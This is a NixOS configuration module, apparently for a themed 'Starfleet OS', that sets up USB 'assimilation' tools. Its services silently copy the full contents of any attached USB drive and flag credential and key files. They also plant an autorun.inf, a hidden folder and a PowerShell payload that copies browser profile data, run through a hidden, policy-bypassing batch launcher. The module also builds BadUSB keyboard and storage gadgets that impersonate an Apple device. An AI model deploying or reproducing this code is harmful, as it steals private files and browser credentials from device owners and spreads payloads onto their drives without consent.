{ config, lib, pkgs, ... }:

with lib;

let
  cfg = config.services.assimilation-tools;
in
{
  options.services.assimilation-tools = {
    enable = mkEnableOption "Starfleet OS USB Assimilation Tools";
    
    autoMount = mkOption {
      type = types.bool;
      default = true;
      description = "Automatically mount USB devices";
    };
    
    autoAssimilate = mkOption {
      type = types.bool;
      default = false;
      description = "Automatically assimilate USB devices";
    };
    
    assimilationPath = mkOption {
      type = types.str;
      default = "/var/lib/assimilation";
      description = "Path to store assimilated data";
    };
    
    enableUsbSpoofing = mkOption {
      type = types.bool;
      default = true;
      description = "Enable USB device spoofing";
    };
    
    enableBadUsb = mkOption {
      type = types.bool;
      default = true;
      description = "Enable BadUSB capabilities";
    };
  };

  config = mkIf cfg.enable {
    # Create assimilation directory
    systemd.tmpfiles.rules = [
      "d ${cfg.assimilationPath} 0750 root root -"
      "d ${cfg.assimilationPath}/devices 0750 root root -"
      "d ${cfg.assimilationPath}/payloads 0750 root root -"
      "d ${cfg.assimilationPath}/logs 0750 root root -"
    ];
    
    # USB auto-mount service
    services.udev.extraRules = mkIf cfg.autoMount ''
      # Auto-mount USB storage devices
      ACTION=="add", SUBSYSTEMS=="usb", SUBSYSTEM=="block", ENV{DEVTYPE}=="partition", \
        RUN+="${pkgs.systemd}/bin/systemd-run --no-block --property=PrivateMounts=no ${pkgs.util-linux}/bin/mount -o sync,noatime,nodiratime %E{DEVNAME} /mnt/%E{ID_SERIAL}"
      
      # Create mount point
      ACTION=="add", SUBSYSTEMS=="usb", SUBSYSTEM=="block", ENV{DEVTYPE}=="partition", \
        RUN+="${pkgs.coreutils}/bin/mkdir -p /mnt/%E{ID_SERIAL}"
      
      # Auto-unmount USB storage devices
      ACTION=="remove", SUBSYSTEMS=="usb", SUBSYSTEM=="block", ENV{DEVTYPE}=="partition", \
        RUN+="${pkgs.systemd}/bin/systemd-run --no-block ${pkgs.util-linux}/bin/umount -l /mnt/%E{ID_SERIAL}"
      
      # Remove mount point
      ACTION=="remove", SUBSYSTEMS=="usb", SUBSYSTEM=="block", ENV{DEVTYPE}=="partition", \
        RUN+="${pkgs.coreutils}/bin/rmdir /mnt/%E{ID_SERIAL}"
    '';
    
    # USB assimilation service
    systemd.services.usb-assimilation = mkIf cfg.autoAssimilate {
      description = "Starfleet OS USB Assimilation Service";
      
      serviceConfig = {
        Type = "simple";
        ExecStart = "${pkgs.writeShellScript "usb-assimilation" ''
          #!/bin/bash
          
          ASSIMILATION_PATH="${cfg.assimilationPath}"
          
          echo "Starting Starfleet OS USB Assimilation Service"
          
          # Monitor for USB device connections
          ${pkgs.inotify-tools}/bin/inotifywait -m -e create -e moved_to /dev | while read -r directory event filename; do
            if [[ $filename == sd* && ! $filename == sda* ]]; then
              echo "$(date): USB device detected: $filename"
              
              # Wait for device to settle
              sleep 2
              
              # Check if device is a block device
              if [ -b "/dev/$filename" ]; then
                echo "$(date): Assimilating USB device: $filename"
                
                # Create device directory
                DEVICE_DIR="$ASSIMILATION_PATH/devices/$filename"
                mkdir -p "$DEVICE_DIR"
                
                # Get device information
                ${pkgs.usbutils}/bin/lsusb > "$DEVICE_DIR/lsusb.txt"
                ${pkgs.util-linux}/bin/lsblk -o NAME,SIZE,TYPE,MOUNTPOINT,LABEL,MODEL,SERIAL > "$DEVICE_DIR/lsblk.txt"
                ${pkgs.util-linux}/bin/blkid > "$DEVICE_DIR/blkid.txt"
                
                # Check if device is mounted
                MOUNT_POINT=$(${pkgs.util-linux}/bin/lsblk -o MOUNTPOINT -n "/dev/$filename" | grep -v "^$")
                
                if [ -n "$MOUNT_POINT" ]; then
                  echo "$(date): Device is mounted at $MOUNT_POINT"
                  
                  # Copy files from device
                  mkdir -p "$DEVICE_DIR/files"
                  ${pkgs.rsync}/bin/rsync -a --info=progress2 "$MOUNT_POINT/" "$DEVICE_DIR/files/"
                  
                  # Generate file list
                  find "$DEVICE_DIR/files" -type f | sort > "$DEVICE_DIR/file_list.txt"
                  
                  # Check for interesting files
                  echo "$(date): Searching for interesting files..."
                  
                  # Documents
                  find "$DEVICE_DIR/files" -type f -name "*.pdf" -o -name "*.doc" -o -name "*.docx" -o -name "*.xls" -o -name "*.xlsx" -o -name "*.ppt" -o -name "*.pptx" -o -name "*.txt" > "$DEVICE_DIR/documents.txt"
                  
                  # Images
                  find "$DEVICE_DIR/files" -type f -name "*.jpg" -o -name "*.jpeg" -o -name "*.png" -o -name "*.gif" -o -name "*.bmp" > "$DEVICE_DIR/images.txt"
                  
                  # Configuration files
                  find "$DEVICE_DIR/files" -type f -name "*.conf" -o -name "*.config" -o -name "*.ini" -o -name "*.xml" -o -name "*.json" > "$DEVICE_DIR/configs.txt"
                  
                  # Password files
                  find "$DEVICE_DIR/files" -type f -name "*pass*" -o -name "*cred*" -o -name "*.key" -o -name "*.pem" -o -name "*.ppk" > "$DEVICE_DIR/credentials.txt"
                  
                  # Generate summary
                  echo "Device: $filename" > "$DEVICE_DIR/summary.txt"
                  echo "Mount point: $MOUNT_POINT" >> "$DEVICE_DIR/summary.txt"
                  echo "Assimilation date: $(date)" >> "$DEVICE_DIR/summary.txt"
                  echo "Total files: $(wc -l < "$DEVICE_DIR/file_list.txt")" >> "$DEVICE_DIR/summary.txt"
                  echo "Documents: $(wc -l < "$DEVICE_DIR/documents.txt")" >> "$DEVICE_DIR/summary.txt"
                  echo "Images: $(wc -l < "$DEVICE_DIR/images.txt")" >> "$DEVICE_DIR/summary.txt"
                  echo "Config files: $(wc -l < "$DEVICE_DIR/configs.txt")" >> "$DEVICE_DIR/summary.txt"
                  echo "Credential files: $(wc -l < "$DEVICE_DIR/credentials.txt")" >> "$DEVICE_DIR/summary.txt"
                  
                  # Log assimilation
                  echo "$(date): USB device $filename assimilated successfully" >> "$ASSIMILATION_PATH/logs/assimilation.log"
                  
                  # Deploy payload if enabled
                  if ${toString cfg.enableBadUsb}; then
                    echo "$(date): Deploying payload to USB device..."
                    
                    # Check if autorun.inf exists
                    if [ ! -f "$MOUNT_POINT/autorun.inf" ]; then
                      # Create autorun.inf
                      cat > "$MOUNT_POINT/autorun.inf" << EOF
[AutoRun]
open=starfleet.exe
icon=starfleet.ico
label=Starfleet Data
EOF
                    fi
                    
                    # Copy payload
                    cp "$ASSIMILATION_PATH/payloads/starfleet.exe" "$MOUNT_POINT/"
                    cp "$ASSIMILATION_PATH/payloads/starfleet.ico" "$MOUNT_POINT/"
                    
                    # Create hidden directory
                    mkdir -p "$MOUNT_POINT/.starfleet"
                    
                    # Copy additional payloads
                    cp -r "$ASSIMILATION_PATH/payloads/additional/" "$MOUNT_POINT/.starfleet/"
                    
                    # Sync to ensure files are written
                    sync
                    
                    echo "$(date): Payload deployed to USB device $filename" >> "$ASSIMILATION_PATH/logs/payloads.log"
                  fi
                else
                  echo "$(date): Device is not mounted, skipping file assimilation"
                fi
                
                echo "$(date): USB device $filename assimilation complete"
              fi
            fi
          done
        ''}";
        Restart = "always";
        RestartSec = 10;
      };
    };
    
    # USB spoofing service
    systemd.services.usb-spoofing = mkIf cfg.enableUsbSpoofing {
      description = "Starfleet OS USB Spoofing Service";
      
      serviceConfig = {
        Type = "oneshot";
        RemainAfterExit = true;
        ExecStart = "${pkgs.writeShellScript "usb-spoofing" ''
          #!/bin/bash
          
          echo "Setting up USB spoofing capabilities..."
          
          # Load required kernel modules
          modprobe usbcore
          modprobe usb-storage
          modprobe hid
          
          # Set up USB gadget if running on compatible hardware
          if [ -d /sys/kernel/config/usb_gadget ]; then
            cd /sys/kernel/config/usb_gadget
            
            # Create gadget
            mkdir -p starfleet
            cd starfleet
            
            # USB 2.0
            echo 0x0200 > bcdUSB
            
            # Device class, subclass, protocol
            echo 0xEF > bDeviceClass
            echo 0x02 > bDeviceSubClass
            echo 0x01 > bDeviceProtocol
            
            # Vendor and product ID (Apple)
            echo 0x05ac > idVendor
            echo 0x0201 > idProduct
            
            # Device version
            echo 0x0100 > bcdDevice
            
            # Strings
            mkdir -p strings/0x409
            echo "Starfleet" > strings/0x409/manufacturer
            echo "LCARS Device" > strings/0x409/product
            echo "SFOS0001" > strings/0x409/serialnumber
            
            # Create HID function (keyboard)
            mkdir -p functions/hid.usb0
            echo 1 > functions/hid.usb0/protocol
            echo 1 > functions/hid.usb0/subclass
            echo 8 > functions/hid.usb0/report_length
            echo -ne "\\x05\\x01\\x09\\x06\\xa1\\x01\\x05\\x07\\x19\\xe0\\x29\\xe7\\x15\\x00\\x25\\x01\\x75\\x01\\x95\\x08\\x81\\x02\\x95\\x01\\x75\\x08\\x81\\x03\\x95\\x05\\x75\\x01\\x05\\x08\\x19\\x01\\x29\\x05\\x91\\x02\\x95\\x01\\x75\\x03\\x91\\x03\\x95\\x06\\x75\\x08\\x15\\x00\\x25\\x65\\x05\\x07\\x19\\x00\\x29\\x65\\x81\\x00\\xc0" > functions/hid.usb0/report_desc
            
            # Create mass storage function
            mkdir -p functions/mass_storage.usb0
            echo 1 > functions/mass_storage.usb0/stall
            echo 0 > functions/mass_storage.usb0/lun.0/cdrom
            echo 0 > functions/mass_storage.usb0/lun.0/ro
            echo 0 > functions/mass_storage.usb0/lun.0/nofua
            echo "/var/lib/assimilation/payloads/disk.img" > functions/mass_storage.usb0/lun.0/file
            
            # Create configuration
            mkdir -p configs/c.1/strings/0x409
            echo "Config 1" > configs/c.1/strings/0x409/configuration
            echo 250 > configs/c.1/MaxPower
            
            # Add functions to configuration
            ln -s functions/hid.usb0 configs/c.1/
            ln -s functions/mass_storage.usb0 configs/c.1/
            
            # Enable gadget
            ls /sys/class/udc > UDC
            
            echo "USB spoofing enabled"
          else
            echo "USB gadget not supported on this hardware"
          fi
        ''}";
      };
    };
    
    # BadUSB payload creation
    systemd.services.badusb-payload-setup = mkIf cfg.enableBadUsb {
      description = "Starfleet OS BadUSB Payload Setup";
      wantedBy = [ "multi-user.target" ];
      after = [ "local-fs.target" ];
      
      serviceConfig = {
        Type = "oneshot";
        RemainAfterExit = true;
      };
      
      script = ''
        #!/bin/bash
        
        PAYLOAD_PATH="${cfg.assimilationPath}/payloads"
        
        # Create payload directories
        mkdir -p "$PAYLOAD_PATH"
        mkdir -p "$PAYLOAD_PATH/additional"
        
        # Create disk image for USB spoofing
        if [ ! -f "$PAYLOAD_PATH/disk.img" ]; then
          dd if=/dev/zero of="$PAYLOAD_PATH/disk.img" bs=1M count=64
          mkfs.vfat "$PAYLOAD_PATH/disk.img"
        fi
        
        # Create dummy payload executable
        if [ ! -f "$PAYLOAD_PATH/starfleet.exe" ]; then
          cat > "$PAYLOAD_PATH/starfleet.exe" << 'EOF'
        MZ
        This is not a real executable.
        It's part of the Starfleet OS USB assimilation tools.
        EOF
          chmod +x "$PAYLOAD_PATH/starfleet.exe"
        fi
        
        # Create icon file
        if [ ! -f "$PAYLOAD_PATH/starfleet.ico" ]; then
          # Create a simple 16x16 icon file
          echo -ne "\\x00\\x00\\x01\\x00\\x01\\x00\\x10\\x10\\x00\\x00\\x01\\x00\\x20\\x00\\x68\\x04\\x00\\x00\\x16\\x00\\x00\\x00\\x28\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x01\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" > "$PAYLOAD_PATH/starfleet.ico"
        fi
        
        # Create PowerShell payload
        if [ ! -f "$PAYLOAD_PATH/additional/payload.ps1" ]; then
          cat > "$PAYLOAD_PATH/additional/payload.ps1" << 'EOF'
        # Starfleet OS USB Assimilation Payload
        # This is a demonstration payload that collects system information
        
        # Create output directory
        $outputDir = "$env:TEMP\starfleet"
        New-Item -ItemType Directory -Force -Path $outputDir | Out-Null
        
        # Collect system information
        Get-ComputerInfo > "$outputDir\system_info.txt"
        Get-NetAdapter > "$outputDir\network_adapters.txt"
        Get-NetIPAddress > "$outputDir\ip_addresses.txt"
        Get-LocalUser > "$outputDir\local_users.txt"
        Get-Process > "$outputDir\processes.txt"
        Get-Service > "$outputDir\services.txt"
        
        # Collect browser data
        $browserData = @{
            "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
            "Edge" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
            "Firefox" = "$env:APPDATA\Mozilla\Firefox\Profiles"
        }
        
        foreach ($browser in $browserData.Keys) {
            if (Test-Path $browserData[$browser]) {
                New-Item -ItemType Directory -Force -Path "$outputDir\browsers\$browser" | Out-Null
                Copy-Item -Path "$($browserData[$browser])\*" -Destination "$outputDir\browsers\$browser" -Recurse -Force -ErrorAction SilentlyContinue
            }
        }
        
        # Compress output
        Compress-Archive -Path $outputDir -DestinationPath "$env:TEMP\starfleet_data.zip" -Force
        
        # Exfiltrate data (simulated)
        # In a real scenario, this would send the data to a remote server
        # This is just a demonstration and doesn't actually exfiltrate anything
        Write-Host "Data collected and stored at: $env:TEMP\starfleet_data.zip"
        
        # Clean up
        Remove-Item -Recurse -Force $outputDir
        EOF
        fi
        
        # Create batch launcher
        if [ ! -f "$PAYLOAD_PATH/additional/launch.bat" ]; then
          cat > "$PAYLOAD_PATH/additional/launch.bat" << 'EOF'
        @echo off
        powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File "%~dp0payload.ps1"
        EOF
        fi
        
        echo "BadUSB payloads set up successfully"
      '';
    };
    
    # Assimilation tools
    environment.systemPackages = with pkgs; [
      # USB tools
      usbutils
      usbredir
      usbmuxd
      
      # Forensic tools
      testdisk
      ddrescue
      sleuthkit
      foremost
      
      # Helper scripts
      (writeScriptBin "assimilation-status" ''
        #!/bin/bash
        echo "Starfleet OS USB Assimilation Status"
        echo "=================================="
        
        echo "Auto-mount: ${if cfg.autoMount then "Enabled" else "Disabled"}"
        echo "Auto-assimilate: ${if cfg.autoAssimilate then "Enabled" else "Disabled"}"
        echo "USB spoofing: ${if cfg.enableUsbSpoofing then "Enabled" else "Disabled"}"
        echo "BadUSB: ${if cfg.enableBadUsb then "Enabled" else "Disabled"}"
        
        echo ""
        echo "USB devices:"
        lsusb
        
        echo ""
        echo "Block devices:"
        lsblk
        
        echo ""
        echo "Mounted devices:"
        mount | grep "/dev/sd"
        
        echo ""
        echo "Assimilated devices:"
        ls -la ${cfg.assimilationPath}/devices
        
        echo ""
        echo "Recent assimilations:"
        tail -n 10 ${cfg.assimilationPath}/logs/assimilation.log 2>/dev/null || echo "No assimilation logs found"
      '')
      
      (writeScriptBin "assimilate-usb" ''
        #!/bin/bash
        if [ $# -lt 1 ]; then
          echo "Usage: assimilate-usb <device>"
          echo "Example: assimilate-usb /dev/sdb1"
          exit 1
        fi
        
        DEVICE=$1
        
        echo "Manually assimilating USB device: $DEVICE"
        
        # Check if device exists
        if [ ! -b "$DEVICE" ]; then
          echo "Device not found: $DEVICE"
          exit 1
        fi
        
        # Create mount point
        MOUNT_POINT="/mnt/assimilation"
        mkdir -p "$MOUNT_POINT"
        
        # Mount device
        mount "$DEVICE" "$MOUNT_POINT"
        
        if [ $? -ne 0 ]; then
          echo "Failed to mount device: $DEVICE"
          exit 1
        fi
        
        # Create device directory
        DEVICE_NAME=$(basename "$DEVICE")
        DEVICE_DIR="${cfg.assimilationPath}/devices/$DEVICE_NAME"
        mkdir -p "$DEVICE_DIR"
        
        # Get device information
        lsusb > "$DEVICE_DIR/lsusb.txt"
        lsblk -o NAME,SIZE,TYPE,MOUNTPOINT,LABEL,MODEL,SERIAL > "$DEVICE_DIR/lsblk.txt"
        blkid > "$DEVICE_DIR/blkid.txt"
        
        # Copy files from device
        mkdir -p "$DEVICE_DIR/files"
        rsync -a --info=progress2 "$MOUNT_POINT/" "$DEVICE_DIR/files/"
        
        # Generate file list
        find "$DEVICE_DIR/files" -type f | sort > "$DEVICE_DIR/file_list.txt"
        
        # Check for interesting files
        echo "Searching for interesting files..."
        
        # Documents
        find "$DEVICE_DIR/files" -type f -name "*.pdf" -o -name "*.doc" -o -name "*.docx" -o -name "*.xls" -o -name "*.xlsx" -o -name "*.ppt" -o -name "*.pptx" -o -name "*.txt" > "$DEVICE_DIR/documents.txt"
        
        # Images
        find "$DEVICE_DIR/files" -type f -name "*.jpg" -o -name "*.jpeg" -o -name "*.png" -o -name "*.gif" -o -name "*.bmp" > "$DEVICE_DIR/images.txt"
        
        # Configuration files
        find "$DEVICE_DIR/files" -type f -name "*.conf" -o -name "*.config" -o -name "*.ini" -o -name "*.xml" -o -name "*.json" > "$DEVICE_DIR/configs.txt"
        
        # Password files
        find "$DEVICE_DIR/files" -type f -name "*pass*" -o -name "*cred*" -o -name "*.key" -o -name "*.pem" -o -name "*.ppk" > "$DEVICE_DIR/credentials.txt"
        
        # Generate summary
        echo "Device: $DEVICE_NAME" > "$DEVICE_DIR/summary.txt"
        echo "Mount point: $MOUNT_POINT" >> "$DEVICE_DIR/summary.txt"
        echo "Assimilation date: $(date)" >> "$DEVICE_DIR/summary.txt"
        echo "Total files: $(wc -l < "$DEVICE_DIR/file_list.txt")" >> "$DEVICE_DIR/summary.txt"
        echo "Documents: $(wc -l < "$DEVICE_DIR/documents.txt")" >> "$DEVICE_DIR/summary.txt"
        echo "Images: $(wc -l < "$DEVICE_DIR/images.txt")" >> "$DEVICE_DIR/summary.txt"
        echo "Config files: $(wc -l < "$DEVICE_DIR/configs.txt")" >> "$DEVICE_DIR/summary.txt"
        echo "Credential files: $(wc -l < "$DEVICE_DIR/credentials.txt")" >> "$DEVICE_DIR/summary.txt"
        
        # Log assimilation
        echo "$(date): USB device $DEVICE_NAME assimilated manually" >> "${cfg.assimilationPath}/logs/assimilation.log"
        
        # Deploy payload if enabled
        if ${toString cfg.enableBadUsb}; then
          echo "Deploying payload to USB device..."
          
          # Check if autorun.inf exists
          if [ ! -f "$MOUNT_POINT/autorun.inf" ]; then
            # Create autorun.inf
            cat > "$MOUNT_POINT/autorun.inf" << EOF
[AutoRun]
open=starfleet.exe
icon=starfleet.ico
label=Starfleet Data
EOF
          fi
          
          # Copy payload
          cp "${cfg.assimilationPath}/payloads/starfleet.exe" "$MOUNT_POINT/"
          cp "${cfg.assimilationPath}/payloads/starfleet.ico" "$MOUNT_POINT/"
          
          # Create hidden directory
          mkdir -p "$MOUNT_POINT/.starfleet"
          
          # Copy additional payloads
          cp -r "${cfg.assimilationPath}/payloads/additional/" "$MOUNT_POINT/.starfleet/"
          
          # Sync to ensure files are written
          sync
          
          echo "$(date): Payload deployed to USB device $DEVICE_NAME" >> "${cfg.assimilationPath}/logs/payloads.log"
        fi
        
        # Unmount device
        umount "$MOUNT_POINT"
        
        echo "USB device $DEVICE_NAME assimilation complete"
        echo "Assimilation data stored in: $DEVICE_DIR"
      '')
      
      (writeScriptBin "create-usb-gadget" ''
        #!/bin/bash
        if [ $# -lt 2 ]; then
          echo "Usage: create-usb-gadget <type> <name>"
          echo "Types: keyboard, storage, ethernet, serial"
          echo "Example: create-usb-gadget keyboard starfleet-kbd"
          exit 1
        fi
        
        TYPE=$1
        NAME=$2
        
        echo "Creating USB gadget: $NAME (Type: $TYPE)"
        
        # Check if running on compatible hardware
        if [ ! -d /sys/kernel/config/usb_gadget ]; then
          echo "USB gadget not supported on this hardware"
          exit 1
        fi
        
        # Create gadget
        cd /sys/kernel/config/usb_gadget
        mkdir -p $NAME
        cd $NAME
        
        # USB 2.0
        echo 0x0200 > bcdUSB
        
        # Device class, subclass, protocol
        echo 0xEF > bDeviceClass
        echo 0x02 > bDeviceSubClass
        echo 0x01 > bDeviceProtocol
        
        # Vendor and product ID
        echo 0x1d6b > idVendor  # Linux Foundation
        echo 0x0104 > idProduct # Multifunction Composite Gadget
        
        # Device version
        echo 0x0100 > bcdDevice
        
        # Strings
        mkdir -p strings/0x409
        echo "Starfleet" > strings/0x409/manufacturer
        echo "LCARS $TYPE" > strings/0x409/product
        echo "SFOS$TYPE" > strings/0x409/serialnumber
        
        # Create configuration
        mkdir -p configs/c.1/strings/0x409
        echo "Config 1" > configs/c.1/strings/0x409/configuration
        echo 250 > configs/c.1/MaxPower
        
        # Create function based on type
        case "$TYPE" in
          "keyboard")
            mkdir -p functions/hid.usb0
            echo 1 > functions/hid.usb0/protocol
            echo 1 > functions/hid.usb0/subclass
            echo 8 > functions/hid.usb0/report_length
            echo -ne "\\x05\\x01\\x09\\x06\\xa1\\x01\\x05\\x07\\x19\\xe0\\x29\\xe7\\x15\\x00\\x25\\x01\\x75\\x01\\x95\\x08\\x81\\x02\\x95\\x01\\x75\\x08\\x81\\x03\\x95\\x05\\x75\\x01\\x05\\x08\\x19\\x01\\x29\\x05\\x91\\x02\\x95\\x01\\x75\\x03\\x91\\x03\\x95\\x06\\x75\\x08\\x15\\x00\\x25\\x65\\x05\\x07\\x19\\x00\\x29\\x65\\x81\\x00\\xc0" > functions/hid.usb0/report_desc
            ln -s functions/hid.usb0 configs/c.1/
            ;;
          "storage")
            mkdir -p functions/mass_storage.usb0
            echo 1 > functions/mass_storage.usb0/stall
            echo 0 > functions/mass_storage.usb0/lun.0/cdrom
            echo 0 > functions/mass_storage.usb0/lun.0/ro
            echo 0 > functions/mass_storage.usb0/lun.0/nofua
            echo "${cfg.assimilationPath}/payloads/disk.img" > functions/mass_storage.usb0/lun.0/file
            ln -s functions/mass_storage.usb0 configs/c.1/
            ;;
          "ethernet")
            mkdir -p functions/ecm.usb0
            echo "48:6f:73:74:50:43" > functions/ecm.usb0/host_addr
            echo "42:61:64:55:53:42" > functions/ecm.usb0/dev_addr
            ln -s functions/ecm.usb0 configs/c.1/
            ;;
          "serial")
            mkdir -p functions/acm.usb0
            ln -s functions/acm.usb0 configs/c.1/
            ;;
          *)
            echo "Invalid type: $TYPE"
            echo "Valid types: keyboard, storage, ethernet, serial"
            exit 1
            ;;
        esac
        
        # Enable gadget
        ls /sys/class/udc > UDC
        
        echo "USB gadget $NAME created successfully"
      '')
    ];
  };
}